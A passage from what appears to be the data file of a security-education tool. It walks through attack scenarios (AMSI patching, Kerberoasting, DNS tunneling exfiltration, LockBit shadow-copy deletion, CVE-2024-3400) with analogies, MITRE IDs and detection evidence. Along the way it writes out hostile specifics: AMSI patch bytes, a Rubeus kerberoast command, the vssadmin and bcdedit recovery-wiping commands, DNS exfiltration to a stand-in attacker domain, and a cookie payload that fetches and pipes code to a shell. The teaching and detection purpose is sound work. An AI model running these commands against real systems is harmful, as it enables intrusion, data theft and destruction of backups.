          'Every PowerShell process automatically loads C:\\Windows\\System32\\amsi.dll (the Windows Antimalware Scan Interface library that inspects scripts before they run) into its own user-mode memory space. Running inside powershell.exe (PID 6120, launched with -NoP -NonI -W Hidden -Exec Bypass under CORP\\admin_clark), the attacker uses .NET P/Invoke to call LoadLibrary("amsi.dll") and GetProcAddress("AmsiScanBuffer"), receiving the function’s in-memory export address 0x7FF91A042480 (which pinpoints the exact byte offset where AMSI starts inspecting scripts), and prepares VirtualProtect to flip that page from PAGE_EXECUTE_READ (0x20) to PAGE_EXECUTE_READWRITE (0x40).',
        howItWorksInPractice:
          'Because amsi.dll operates in user mode (Ring 3, sharing the same virtual address space and permissions as powershell.exe PID 6120 rather than being isolated in the Windows kernel), any code running inside PowerShell can resolve amsi.dll!AmsiScanBuffer at 0x7FF91A042480 via P/Invoke (though executing this first stager script triggers a Warning-level PowerShell Operational Event ID 4104 ScriptBlock log before the patch is written).',
        diagramAlignment:
          'On the diagram, Step #1 / Link #1 (#1→ / ⇠#1) shows Node ③ (DEV-WKS-09) and Node ④ (powershell.exe PID 6120) resolving amsi.dll!AmsiScanBuffer (0x7FF91A042480) and logging PowerShell Event ID 4104 (Warning).',
        detectionAndEvidence:
          'Documented in PowerShell EventID 4104 (ScriptBlockLogging, Level=Warning) & Win32 API telemetry: P/Invoke resolving amsi.dll!AmsiScanBuffer (0x7FF91A042480) and preparing VirtualProtect(0x40).',
      },
      {
        stepNumber: 2,
        mitreId: 'T1562.001',
        plainTitle: 'Overwriting 6 Bytes of AmsiScanBuffer So Every Scan Immediately Returns "Clean"',
        storyAnalogy:
          'With the inspection cover open, the intruder replaces the scanner’s sensor circuit with a 6-byte shortcut that immediately stamps "E_INVALIDARG / CLEAN" and exits before the camera even turns on.',
        simpleExplanation:
          'After calling VirtualProtect(0x7FF91A042480, 6, 0x40) (which unlocks the code page and returns the previous protection 0x20), powershell.exe (PID 6120) uses [System.Runtime.InteropServices.Marshal]::Copy to overwrite the first 6 bytes of AmsiScanBuffer (4C 8B DC 49 89 5B) with B8 57 00 07 80 C3 (which disassembles to "mov eax, 0x80070057; ret", instructing the CPU to immediately return error code E_INVALIDARG and exit the function). From this instant on, whenever PowerShell hands a script or assembly buffer to AMSI, AmsiScanBuffer returns E_INVALIDARG at byte 0 (which PowerShell treats as a non-detection, allowing subsequent payloads to run uninspected).',
        howItWorksInPractice:
          'AmsiScanBuffer normally validates its arguments and passes the script buffer to the registered antivirus provider. Overwriting its 6-byte prologue at 0x7FF91A042480 in RAM triggers a Copy-on-Write page split in PID 6120’s Virtual Address Descriptor (VAD) tree (converting the shared signed amsi.dll .text page into a private modified page that Kernel ETW TiProtectVM and EDR integrity scanners flag).',
        diagramAlignment:
          'On the diagram, Step #2 / Link #2 (#2→ / ⇠#2) runs from Node ④ (powershell.exe PID 6120) to amsi.dll (0x7FF91A042480) and Node ⑥ (Event 4104 & EDR), logging the 6-byte prologue patch.',
        detectionAndEvidence:
          'Documented by Microsoft-Windows-Threat-Intelligence ETW & EDR Memory Scanner: 6-byte prologue modification at amsi.dll!AmsiScanBuffer (0x7FF91A042480: 4C 8B DC -> B8 57 00 07 80 C3) creating a private Copy-on-Write page.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1620',
        plainTitle: 'Reflectively Loading a 512 KB .NET / PE Agent Directly From a Byte Array in RAM',
        storyAnalogy:
          'Now that the room’s X-ray scanner is blind, the intruder unfolds a complete communication radio directly out of a memorized blueprint in their head ([Reflection.Assembly]::Load), never placing a single file onto the floor where a floor sensor could spot it.',
        simpleExplanation:
          'With AMSI blinded inside PID 6120 (because normally calling Assembly::Load in .NET 4.8+ triggers an automatic AmsiScanBuffer check on the byte array, which would have caught the unencrypted DLL if Step 2 had not patched it first), the attacker decodes the stage-2 payload in RAM and invokes [System.Reflection.Assembly]::Load([byte[]]$dllBytes). The reflective loader allocates a 512 KB private RWX heap region at base address 0x024A80000 (mapping the MZ/PE headers, resolving imports, and invoking the agent entry point directly in memory without ever writing a .dll file to the hard drive or registering in the PEB Ldr module list).',
        howItWorksInPractice:
          'Reflective code loading parses the PE/COFF headers from a raw byte array and maps the 512 KB executable image into anonymous private heap memory (0x024A80000 with RWX protection, bypassing Sysmon Event ID 7 file-backed DLL load callbacks while leaving an unbacked MZ 4D 5A header in private RAM that PE-sieve and .NET Runtime ETW detect).',
        diagramAlignment:
          'On the diagram, Step #3 / Link #3 (#3→ / ⇠#3) maps the 512 KB reflective assembly into Node ④ (Reflective PE Heap 0x024A80000 RWX) inside powershell.exe (PID 6120), while Node ⑥ (Event 4104 & EDR) alerts on the unbacked executable heap image.',
        detectionAndEvidence:
          'Documented in PE-sieve / Moneta Memory Scanner & DotNETRuntime ETW: unbacked 512 KB RWX PE image ("MZ" 4D 5A header) detected in private heap at 0x024A80000 inside powershell.exe (PID 6120) with no backing file on disk.',
      },
    ],
  },

  'ad-kerberoasting': {
    scenarioId: 'ad-kerberoasting',
    briefing: {
      headline: 'Scenario Briefing: Active Directory Kerberoasting (MITRE T1558.003): Requesting Service Tickets to Crack Offline',
      storyAnalogy:
        'Imagine a theme park where any visitor with a basic entry wristband is allowed to walk up to the ticket booth and ask for a sealed VIP voucher to the SQL Rollercoaster. The booth seals that voucher using the rollercoaster manager’s secret password. Instead of riding the coaster, the attacker takes the sealed voucher home to their basement and tries millions of passwords per second until the seal pops open, without a single guard at the park knowing they are guessing.',
      plainSummary:
        'In Windows Active Directory, any standard domain user is allowed to ask the Domain Controller (DC01.corp.local, 10.10.1.5) for a Kerberos Service Ticket (TGS) to connect to any service registered with a Service Principal Name (SPN, the directory tag that links a network service like SQL Server to the service account that runs it). Because the Domain Controller encrypts that ticket using the password hash of the target service account (svc_mssql), an attacker on WS-FINANCE-04 (10.10.20.45, running Rubeus.exe PID 3920 under standard user CORP\\m.davis) can request the ticket for MSSQLSvc/sql01.corp.local:1433 with downgraded RC4 encryption (etype 0x17, Windows Security Event ID 4769), crack the $krb5tgs$23$* hash offline with Hashcat (-m 13100) to recover svc_mssql’s password, authenticate over SMB (LogonType = 3, Event ID 4624) to SQL01.corp.local (10.10.5.20), and spawn PSEXESVC.exe (PID 5190 via services.exe PID 628, Event ID 7045) as NT AUTHORITY\\SYSTEM.',
      diagramTopologySummary:
        'On the diagram: Start at Node ③/④ (Compromised Workstation WS-FINANCE-04 10.10.20.45 / Rubeus.exe PID 3920), follow Step #1 (#1→) requesting the RC4 Kerberos TGS ticket from Node ⑤ (Domain Controller DC01.corp.local 10.10.1.5:88), trace Step #2 (#2→) authenticating with the cracked svc_mssql account over SMB (TCP/445) to SQL01.corp.local (10.10.5.20), and watch Step #3 (#3→) install and run PSEXESVC.exe (PID 5190) as SYSTEM monitored by Node ⑥ (SIEM Log Collector).',
      documentedAdvisory: 'MITRE ATT&CK T1558.003 · T1550.002 · T1569.002 · Windows Security EventID 4769 / 4624 / System EventID 7045',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1558.003',
        plainTitle: 'Enumerating SPNs & Requesting an RC4-Downgraded Kerberos TGS Ticket (Event ID 4769)',
        storyAnalogy:
          'The visitor opens the park’s public phonebook (LDAP), finds the SQL attraction run by a human manager (svc_mssql), and asks the central ticket booth (DC01.corp.local:88) for a voucher sealed with an older, fast-to-crack wax stamp (0x17 RC4-HMAC) instead of modern armor (AES-256).',
        simpleExplanation:
          'From the compromised workstation WS-FINANCE-04 (10.10.20.45) using standard domain account CORP\\m.davis, the attacker runs Rubeus.exe (PID 3920, PPID 2104: Rubeus.exe kerberoast /spn:MSSQLSvc/sql01.corp.local:1433 /nowrap). After querying LDAP (TCP/389) on DC01.corp.local (10.10.1.5) via ldap_search_ext_s("(servicePrincipalName=*)") to locate MSSQLSvc/sql01.corp.local:1433, Rubeus sends a Kerberos TGS-REQ (TCP/88) with TicketOptions = 0x40810000 requesting encryption type 0x17 (RC4-HMAC, a legacy cipher that encrypts the ticket directly with svc_mssql’s NTLM password hash, making it thousands of times faster to brute-force offline than AES-256 / 0x12).',
        howItWorksInPractice:
          'By design in the Kerberos protocol, the Key Distribution Center (KDC) on DC01.corp.local (10.10.1.5) does not check whether CORP\\m.davis has permission to log into SQL01; it immediately encrypts the KRB_TGS_REP service ticket using svc_mssql’s NTLM hash and returns the RC4 ciphertext to Rubeus.exe (PID 3920) on 10.10.20.45 (while logging Windows Security Event ID 4769 with Status = 0x0 and TicketEncryptionType = 0x17).',
        diagramAlignment:
          'On the diagram, follow Step #1 / Link #1 (#1→ / ⇠#1) from Node ③ (WS-FINANCE-04 10.10.20.45 / Rubeus.exe PID 3920) to Node ⑤ (Domain Controller DC01.corp.local 10.10.1.5:88), returning the RC4-encrypted TGS ticket (Event ID 4769, etype 0x17).',
        detectionAndEvidence:
          'Documented in Windows Security EventID 4769 on DC01.corp.local: TargetUserName = m.davis@CORP.LOCAL, ServiceName = svc_mssql, ClientAddress = 10.10.20.45, TicketOptions = 0x40810000, and TicketEncryptionType = 0x17 (RC4-HMAC).',
      },
      {
        stepNumber: 2,
        mitreId: 'T1550.002',
        plainTitle: 'Offline Hashcat Cracking & Lateral SMB Network Logon to SQL01 (Event ID 4624)',
        storyAnalogy:
          'Back in their private workshop, the attacker tests millions of candidate passwords per second against the sealed voucher ($krb5tgs$23$*) until the seal opens, and then walks straight up to the SQL Server’s administration door (SMB TCP/445) wearing the manager’s real badge (svc_mssql).',
        simpleExplanation:
          'The attacker exports the returned RC4 TGS ticket from WS-FINANCE-04 in $krb5tgs$23$* format and cracks it offline using Hashcat (-m 13100, generating zero failed-login alerts on DC01 because every guess runs locally on the attacker’s GPU). Once svc_mssql’s credential is recovered, the attacker initiates a lateral SMB2 network logon (TCP/445) from WS-FINANCE-04 (10.10.20.45) to the target database server SQL01.corp.local (10.10.5.20) using AuthenticationPackageName = NtLmSsp (which SQL01 accepts and records as Windows Security Event ID 4624 with LogonType = 3).',
        howItWorksInPractice:
          'Because svc_mssql was granted local administrator privileges on SQL01.corp.local (10.10.5.20), completing the NTLMSSP network authentication handshake over TCP/445 returns an authenticated administrative SMB session (granting read/write access to \\\\sql01.corp.local\\ADMIN$ and the remote Service Control Manager pipe \\\\sql01.corp.local\\pipe\\svcctl).',
        diagramAlignment:
          'On the diagram, Step #2 / Link #2 (#2→ / ⇠#2) shows Node ③ (WS-FINANCE-04 10.10.20.45) authenticating over SMB2 (TCP/445) as svc_mssql to Node ⑤ (SQL01.corp.local 10.10.5.20), returning an authenticated session and logging Event ID 4624 (LogonType = 3).',
        detectionAndEvidence:
          'Documented in Windows Security EventID 4624 on SQL01.corp.local: TargetUserName = svc_mssql, LogonType = 3 (Network), AuthenticationPackageName = NtLmSsp, IpAddress = 10.10.20.45.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1569.002',
        plainTitle: 'Remote Service Installation & SYSTEM Execution on SQL01 via PsExec (Event ID 7045)',
        storyAnalogy:
          'Now inside the SQL Server’s admin office, the intruder drops an automated worker (PSEXESVC.exe) into the building’s master service directory and tells the building controller (services.exe) to start it with full SYSTEM authority.',
        simpleExplanation:
          'Using the authenticated SMB session on SQL01.corp.local (10.10.5.20), the attacker uploads PSEXESVC.exe to \\\\sql01.corp.local\\ADMIN$\\PSEXESVC.exe and invokes CreateServiceW and StartServiceW on the remote Service Control Manager (services.exe, PID 628, PPID 512) to install and start a new Windows service named PSEXESVC (ImagePath = %SystemRoot%\\PSEXESVC.exe). Windows logs System Event ID 7045 (A service was installed in the system) as services.exe (PID 628) spawns PSEXESVC.exe (PID 5190) under NT AUTHORITY\\SYSTEM (completing privileged takeover of the database server).',
        howItWorksInPractice:
          'When PsExec calls StartServiceW over the svcctl RPC pipe, services.exe (PID 628) starts C:\\Windows\\PSEXESVC.exe (PID 5190) as LocalSystem (NT AUTHORITY\\SYSTEM), which calls CreateNamedPipeW and CreateProcessAsUserW("cmd.exe") (returning an interactive SYSTEM command shell over encrypted SMB named pipes back to the operator on 10.10.20.45).',
        diagramAlignment:
          'On the diagram, Step #3 / Link #3 (#3→ / ⇠#3) executes PSEXESVC.exe (PID 5190, spawned by services.exe PID 628) on Node ⑤ (SQL01.corp.local 10.10.5.20) and reports System Event ID 7045 to Node ⑥ (SIEM Log Collector).',
        detectionAndEvidence:
          'Documented in Windows System EventID 7045 (ServiceName = PSEXESVC, ImagePath = %SystemRoot%\\PSEXESVC.exe, Account = LocalSystem) & process tree (PSEXESVC.exe PID 5190 spawned by services.exe PID 628).',
      },
    ],
  },

  'dns-tunneling-exfil': {
    scenarioId: 'dns-tunneling-exfil',
    briefing: {
      headline: 'Scenario Briefing: DNS Tunneling & Data Exfiltration (MITRE T1071.004 / T1048.003)',
      storyAnalogy:
        'Imagine a locked-down prison facility where inmates are forbidden from mailing letters or making outside phone calls, but they are allowed to ask the prison operator: "What is the phone number for [Company Name]?" The operator is required to call the outside directory to check. So the inmate asks: "What is the phone number for Secret-Blueprint-Page1-4a6f686e.evil-c2.net?" The prison operator faithfully reads that exact secret message out loud to the accomplice waiting at the evil-c2.net directory desk.',
      plainSummary:
        'Even in tightly locked-down networks where isolated servers cannot browse external websites directly (blocked by Egress Firewall dropping TCP 80/443), internal hosts still resolve domain names through an internal corporate DNS resolver. In this scenario (MITRE T1071.004 & T1048.003), the exfiltration implant sync_agent.exe (PID 4412, PPID 1900 under CORP\\svc_backup) on isolated database backup host DB-BACKUP-02 (10.50.1.12) reads C:\\Backups\\customers_pii.csv, splits it into 48-byte chunks, hex-encodes each chunk into a high-entropy subdomain (<seq>.<hex_data>.c2.badactor-dns.net), and sends UDP/53 DNS TXT queries to the Internal DNS Resolver (10.50.1.53). Experiencing a 100% cache miss rate, 10.50.1.53 recursively forwards every query across the firewall to the attacker’s authoritative Name Server (ns1.badactor-dns.net at 45.133.1.99:53), which reassembles customers_pii.csv and replies with C2 commands inside DNS TXT records (TTL=0).',
      diagramTopologySummary:
        'On the diagram: Start at Node ③/④ (Isolated Host DB-BACKUP-02 10.50.1.12 & sync_agent.exe PID 4412), follow Step #1 (#1→) sending high-entropy DNS TXT queries to Node ② (Internal DNS Resolver 10.50.1.53), trace Step #2 (#2→) recursively relaying the queries across the Egress Firewall to Node ① (Attacker Auth NS ns1.badactor-dns.net 45.133.1.99:53), and watch Step #3 (#3→) return the TXT C2 command ("ACK:001:CMD:SLEEP_60", TTL=0) while Node ⑥ (SOC SIEM / Zeek DNS Sensor) flags the tunnel.',
      documentedAdvisory: 'MITRE ATT&CK T1071.004 & T1048.003 · SANS DNS Tunneling Detection · Sysmon EventID 22 / Zeek dns.log',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1048.003',
        plainTitle: 'Chunking & Hex-Encoding Stolen Data Into High-Entropy Subdomain Queries (Sysmon Event ID 22)',
        storyAnalogy:
          'Before speaking to the prison operator, the inmate shreds the stolen customer ledger (customers_pii.csv) into 48-byte strips and encodes every strip in hexadecimal letters and numbers so it looks like a valid subdomain lookup.',
        simpleExplanation:
          'On the isolated database host DB-BACKUP-02 (10.50.1.12, which has no direct internet access because the Egress Firewall blocks TCP ports 80 and 443), the implant C:\\ProgramData\\sync_agent.exe (PID 4412, running as CORP\\svc_backup) calls ReadFile("customers_pii.csv"), slices each row into 48-byte chunks, hex-encodes the bytes (for example, turning "4102,john_smith,2065" into "343130322c6a6f686e5f736d6974682c32303635"), and calls DnsQuery_A(DNS_TYPE_TXT) to send a 112-byte UDP/53 DNS TXT query for 001.343130322c6a6f686e5f736d6974682c32303635.c2.badactor-dns.net to the Internal DNS Resolver (10.50.1.53:53).',
        howItWorksInPractice:
          'Standard DNS resolvers permit alphanumeric labels up to 63 characters per subdomain label. By hex-encoding 48-byte CSV chunks (producing a Shannon entropy of 4.48 bits/char compared to <3.2 for normal domain names) and querying the local corporate DNS resolver (10.50.1.53:53), sync_agent.exe (PID 4412) receives QueryStatus = 0 with QueryResults = "type: 16 ACK:001:NEXT;" (confirming chunk #001 was delivered and acknowledged so the loop can advance to chunk #002 after Sleep(150), while Sysmon Event ID 22 logs the query on the host).',
        diagramAlignment:
          'On the diagram, follow Step #1 / Link #1 (#1→ / ⇠#1) from Node ③ (DB-BACKUP-02 10.50.1.12 / sync_agent.exe PID 4412) to Node ② (Internal DNS Resolver 10.50.1.53:53), logging Sysmon Event ID 22 (112 B DNS TXT query and ACK:001:NEXT response).',
        detectionAndEvidence:
          'Documented in Sysmon EventID 22 (DNSEvent): ProcessId = 4412, Image = C:\\ProgramData\\sync_agent.exe, QueryName = 001.343130322c6a6f686e5f736d6974682c32303635.c2.badactor-dns.net, QueryStatus = 0, QueryResults = "type: 16 ACK:001:NEXT;".',
      },
      {
        stepNumber: 2,
        mitreId: 'T1071.004',
        plainTitle: 'Recursive Relay Through the Corporate DNS Server Across the Egress Firewall (Zeek dns.log)',
        storyAnalogy:
          'The trusted internal prison operator (Internal DNS Resolver 10.50.1.53) checks their local binder, sees a 100% cache miss because every subdomain is a brand-new chunk of stolen data, and automatically calls the outside internet (45.133.1.99:53) to resolve it.',
        simpleExplanation:
          'Because every single query from DB-BACKUP-02 contains a unique hex-encoded chunk of stolen data in the subdomain label (guaranteeing a 100% DNS cache miss rate so the resolver can never answer from local cache), the Internal DNS Resolver (10.50.1.53) follows standard recursive DNS resolution and forwards the 164-byte UDP/53 TXT query across the Egress Firewall directly to the authoritative Name Server for badactor-dns.net (ns1.badactor-dns.net at 45.133.1.99:53).',
        howItWorksInPractice:
          'While the Egress Firewall blocks direct outbound connections from DB-BACKUP-02 (10.50.1.12), it permits outbound UDP/53 recursive queries originating from the corporate DNS server (10.50.1.53, which receives back the authoritative TXT answer "ACK:001:NEXT" with TTL = 0.000000 and records the 164-byte exchange in Zeek dns.log).',
        diagramAlignment:
          'On the diagram, follow Step #2 / Link #2 (#2→ / ⇠#2) from Node ② (Internal DNS Resolver 10.50.1.53) across the Egress Firewall to Node ① (Attacker Auth NS ns1.badactor-dns.net 45.133.1.99:53), captured in Zeek dns.log (164 B).',
        detectionAndEvidence:
          'Documented in Zeek dns.log & Suricata SID 9004120: 10.50.1.53 -> 45.133.1.99:53 recursive TXT query (qtype = 16, 164 B) with 100% unique subdomains (>52 chars) and answers="ACK:001:NEXT" with TTL = 0.000000.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1071.004',
        plainTitle: 'Reassembling Exfiltrated CSV Chunks & Returning C2 Commands in DNS TXT Answers (TTL=0)',
        storyAnalogy:
          'The accomplice sitting at the ns1.badactor-dns.net desk strips the hex code off every incoming question to rebuild customers_pii.csv, and replies with a DNS TXT answer (ACK:001:CMD:SLEEP_60) that rides all the way back to the implant.',
        simpleExplanation:
          'When the recursive query arrives at the attacker’s authoritative Name Server (ns1.badactor-dns.net, 45.133.1.99:53), the dnscat2/exfil daemon strips the .c2.badactor-dns.net suffix, hex-decodes chunk #001 back into plaintext CSV rows (customers_pii.csv), and sends back a 188-byte DNS TXT response (TXT "ACK:001:CMD:SLEEP_60" with TTL = 0 seconds so the corporate DNS server will not cache the answer). The Internal DNS Resolver (10.50.1.53) relays that 188-byte TXT answer right back to sync_agent.exe (PID 4412) on DB-BACKUP-02 (10.50.1.12).',
        howItWorksInPractice:
          'This completes a bidirectional covert channel over UDP/53: outbound data exfiltration rides inside the DNS query subdomain labels (QNAME), while inbound acknowledgments and C2 tasking (the 188-byte TXT "ACK:001:CMD:SLEEP_60" response with rcode = 0 NOERROR and TTL = 0) ride back inside the DNS TXT answer record to pace the implant’s exfiltration loop.',
        diagramAlignment:
          'On the diagram, Step #3 / Link #3 (#3→ / ⇠#3) returns the DNS TXT response (TXT ACK:001:CMD:SLEEP_60, 188 B, TTL=0) from Node ① (ns1.badactor-dns.net 45.133.1.99:53) to Node ② (Internal DNS Resolver 10.50.1.53) and back to Node ③/④ (DB-BACKUP-02), while Node ⑥ (SIEM) triggers the critical DNS C2 alert.',
        detectionAndEvidence:
          'Documented in Sigma & Suricata DNS rules: 188-byte DNS TXT response with TTL = 0.000000 carrying "TXT ACK:001:CMD:SLEEP_60" from 45.133.1.99:53 through 10.50.1.53 to DB-BACKUP-02 (10.50.1.12).',
      },
    ],
  },

  'ransomware-shadow-wipe': {
    scenarioId: 'ransomware-shadow-wipe',
    briefing: {
      headline: 'Scenario Briefing: Ransomware Pre-Encryption: Wiping Volume Shadow Copies (MITRE T1490 / T1486)',
      storyAnalogy:
        'Imagine an extortionist who plans to put heavy padlocks on every filing cabinet in an office and demand a ransom for the keys. Before clicking a single padlock shut, the first thing they do is walk into the back storage room and shred every photocopy and backup microfilm reel (vssadmin delete shadows /all /quiet), so the office manager cannot simply ignore the padlocks and pull out yesterday’s copies.',
      plainSummary:
        'Before a ransomware payload encrypts a single user document on a Windows server, it performs "Inhibit System Recovery" (MITRE ATT&CK T1490). Windows automatically keeps point-in-time backup snapshots of files using the Volume Shadow Copy Service (VSS). This scenario traces how the LockBit 3.0 ransomware binary (C:\\Windows\\Temp\\lb3_payload.exe, PID 5540, PPID 3100 under CORP\\admin_srv) creates mutex Global\\39481-LB3, spawns vssadmin.exe delete shadows /all /quiet (PID 5812, destroying all local VSS restore points so administrators cannot recover files for free) and bcdedit.exe /set {default} recoveryenabled No, and then executes multi-threaded intermittent AES-NI + RSA-2048 file encryption across D:\\Shares\\Finance\\* (such as Q4_Budget.xlsx.lockbit) while dropping the 4.1 KB Restore-My-Files.txt ransom note.',
      diagramTopologySummary:
        'On the diagram: Start at Node ③ (Target File Server) and Node ④ (lb3_payload.exe PID 5540 → vssadmin.exe PID 5812), follow Step #1 (#1→) wiping all VSS shadow copies inside Node ⑤ (NTFS File System & VSS Subsystem), and trace Step #2 (#2→) performing high-speed intermittent file encryption (*.lockbit) and dropping Restore-My-Files.txt (4.1 KB) while Node ⑥ (EDR Canary & SIEM) triggers containment.',
      documentedAdvisory: 'CISA StopRansomware Guide · MITRE ATT&CK T1490 & T1486 · Sysmon EventID 1 / 11 · Windows EventID 8222',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1490',
        plainTitle: 'Deleting All Windows Volume Shadow Copies & Disabling Boot Recovery (vssadmin delete shadows /all /quiet)',
        storyAnalogy:
          'The extortionist slips into the archive room with an administrator master key, orders the archive clerk (vssadmin.exe / vssvc.exe) to silently incinerate every backup snapshot on the shelves without asking for confirmation (/quiet), and disconnects the emergency recovery switch (bcdedit recoveryenabled No).',
        simpleExplanation:
          'Before encrypting a single document, the LockBit 3.0 payload (C:\\Windows\\Temp\\lb3_payload.exe -pass a8f9102b, PID 5540, running with High/Administrator integrity under CORP\\admin_srv after registering mutex Global\\39481-LB3 and stopping backup services via ControlService) calls CreateProcessW to spawn C:\\Windows\\System32\\vssadmin.exe delete shadows /all /quiet (PID 5812, where "delete shadows /all" instructs the Windows Volume Shadow Copy Service to permanently erase every local backup snapshot on the drive so the victim cannot restore clean files for free, and "/quiet" suppresses confirmation prompts). Immediately after, it runs bcdedit /set {default} recoveryenabled No to disable Windows Automatic Repair boot recovery.',
        howItWorksInPractice:
          'When vssadmin.exe delete shadows /all /quiet (PID 5812, PPID 5540) executes, it invokes IVssBackupComponents::DeleteSnapshots over COM to the Volume Shadow Copy service (vssvc.exe) to drop all copy-on-write shadow storage diff areas on the NTFS volume (because this pre-encryption step happens before file encryption starts, an EDR rule that kills parent PID 5540 the instant Sysmon Event ID 1 logs vssadmin delete shadows stops the ransomware before data loss occurs).',
        diagramAlignment:
          'On the diagram, follow Step #1 / Link #1 (#1→ / ⇠#1) from Node ④ (lb3_payload.exe PID 5540 → vssadmin.exe PID 5812) to Node ⑤ (VSS & WMI Subsystem), wiping all VSS snapshots and triggering Sysmon Event ID 1 on Node ⑥ (EDR Canary & SIEM).',
        detectionAndEvidence:
          'Documented in Sysmon EventID 1 (ProcessId = 5812, CommandLine = "vssadmin.exe delete shadows /all /quiet", ParentProcessId = 5540, ParentImage = "C:\\Windows\\Temp\\lb3_payload.exe", User = CORP\\admin_srv).',
      },
      {
        stepNumber: 2,
        mitreId: 'T1486',
        plainTitle: 'Multi-Threaded Intermittent File Encryption (AES-NI) & Dropping the Ransom Note',
        storyAnalogy:
          'With every backup copy destroyed and the emergency recovery switch disabled, the crew fans out across every floor using high-speed power tools to lock only the front latch (first 64 KB) of every filing cabinet in seconds, taping a ransom note (Restore-My-Files.txt) onto every desk.',
        simpleExplanation:
          'With local recovery paths eliminated, lb3_payload.exe (PID 5540) uses Windows I/O Completion Ports (an asynchronous multi-threaded disk subsystem that saturates all CPU cores at once) and Intermittent Encryption, encrypting only the first 64 KB of each file on D:\\Shares\\Finance\\* (such as renaming Q4_Budget.xlsx to Q4_Budget.xlsx.lockbit via MoveFileExW) using hardware-accelerated AES-256-NI + RSA-2048 session key wrapping (destroying each file’s 64 KB header so thousands of files are locked in seconds before defenders can react), and writes the 4.1 KB ransom note D:\\Shares\\Finance\\Restore-My-Files.txt in every directory.',
        howItWorksInPractice:
          'Full-file encryption on multi-gigabyte databases takes minutes and generates sustained disk I/O spikes that behavioral anti-ransomware minifilters easily spot. Encrypting only the first 64 KB header via MoveFileExW(*.lockbit) and dropping the 4.1 KB Restore-My-Files.txt note ruins file structures at a fraction of the I/O cost (triggering Sysmon Event ID 11 FileCreate alerts and EDR canary file tripwires that isolate the host).',
        diagramAlignment:
          'On the diagram, Step #2 / Link #2 (#2→ / ⇠#2) runs from Node ④ (lb3_payload.exe PID 5540) into Node ⑤ (NTFS File System D:\\Shares\\Finance\\*), renaming files to .lockbit and dropping Restore-My-Files.txt (4.1 KB) while Node ⑥ (EDR Canary & SIEM) triggers Sysmon Event ID 11 host isolation.',
        detectionAndEvidence:
          'Documented in Sysmon EventID 11 (ProcessId = 5540, Image = C:\\Windows\\Temp\\lb3_payload.exe, TargetFilename = D:\\Shares\\Finance\\Restore-My-Files.txt [4.1 KB] and Q4_Budget.xlsx.lockbit) & EDR canary file tripwires.',
      },
    ],
  },

  'unit42-panos-midnight-eclipse': {
    scenarioId: 'unit42-panos-midnight-eclipse',
    briefing: {
      headline: 'Scenario Briefing: Operation Midnight Eclipse (CVE-2024-3400), Palo Alto PAN-OS GlobalProtect Zero-Day',
      storyAnalogy:
        'Imagine a hotel front desk where any guest can hand the clerk a luggage tag (SESSID cookie). The clerk simply uses the guest’s tag name to create an empty note file in a back-office folder, and once every minute, a night janitor reads every filename in that folder out loud into the building’s master Intercom system (bash -c). By writing a file path and a shell command inside the luggage tag itself, the attacker tricks the front desk into planting a booby-trapped filename that the janitor executes with full master-key privileges.',
      plainSummary:
        'Synthesizing independent investigations from Volexity (who discovered the zero-day campaign as UTA0218), Palo Alto Networks Unit 42 (Operation MidnightEclipse), and Rapid7 AttackerKB, CVE-2024-3400 is a critical (CVSS 10.0) unauthenticated command injection flaw in PAN-OS GlobalProtect. The attacker chains two distinct bugs: (1) an arbitrary file-creation flaw in the SESSID HTTP cookie (../../../../opt/panlogs/tmp/device_telemetry/minute/..., using "../" directory traversal to plant a 0-byte file inside the privileged telemetry queue folder) and (2) a shell command-injection flaw when the root-privileged dt_curl / sendTelemetry cron job passes that filename into a backtick-evaluated shell command, allowing the attacker to implant the UPSTYLE Python backdoor in system.pth and steal running-config.xml.',
      diagramTopologySummary:
        'On the diagram: Start at Node ① (UTA0218 Attacker Infrastructure), send the crafted SESSID cookie to Node ②/③ (PAN-OS GlobalProtect Portal :443), watch the file land in /opt/panlogs/tmp/device_telemetry/minute/ and trigger root execution inside Node ④ (dt_curl Telemetry Cron), and trace the UPSTYLE Python backdoor implanted in Node ⑤ (Nginx CSS Path) while Node ⑥ (Cortex XSIAM / SIEM) captures the telemetry.',
      documentedAdvisory: 'Palo Alto Unit 42 MidnightEclipse · Volexity UTA0218 · Rapid7 Root-Cause Analysis · CVE-2024-3400 · CISA KEV',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1190',
        plainTitle: 'Directory Traversal in the "SESSID" Cookie Creates a File With Backtick Shell Commands',
        storyAnalogy:
          'The intruder walks up to the GlobalProtect VPN check-in window and presents a forged SESSID luggage tag that starts with ../../../../, forcing the session clerk to place an empty file directly inside the root janitor’s "To-Do" folder, with a shell command disguised as the filename itself.',
        simpleExplanation:
          'The attacker sends an unauthenticated HTTPS POST request to /ssl-vpn/hipreport.esp (the Host Information Profile endpoint on the GlobalProtect VPN portal, which is reachable from the internet before a user finishes logging in). Instead of a normal session ID, the Cookie: SESSID= header contains ../../../../opt/panlogs/tmp/device_telemetry/minute/aacurl ... | sh (where the "../" path traversal climbs out of the session folder into the firewall’s telemetry queue directory, and the backticks ... embed a Linux shell command directly inside the filename itself).',
        howItWorksInPractice:
          'When GlobalProtect processes hipreport.esp, its session serializer calls fopen() using the raw SESSID cookie value as the file path without stripping "../" sequences (creating an empty 0-byte file on disk, which is all the attacker needs, because the exploit payload lives inside the file’s name, not its contents).',
        diagramAlignment:
          'On the diagram, follow arrow #1→ from Node ① (UTA0218 Attacker) to Node ②/③ (PAN-OS GlobalProtect /ssl-vpn/hipreport.esp), and return arrow ⇠#1 as the 0-byte file is created in /opt/panlogs/tmp/device_telemetry/minute/.',
        detectionAndEvidence:
          'Documented in Unit 42, Volexity & Rapid7 CVE-2024-3400 reports: PAN-OS appweb3 logs showing Cookie: SESSID=../../../../opt/panlogs/tmp/device_telemetry/minute/ and zero-byte file creation errors.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1059.004',
        plainTitle: 'The Root Telemetry Cron Job ("dt_curl") Executes the Malicious Filename as Root',
        storyAnalogy:
          'Sixty seconds later, the automated root janitor (dt_curl) walks into the telemetry folder to upload files, reads the booby-trapped filename out loud inside a shell command without quotation marks, and accidentally runs the attacker’s script as root.',
        simpleExplanation:
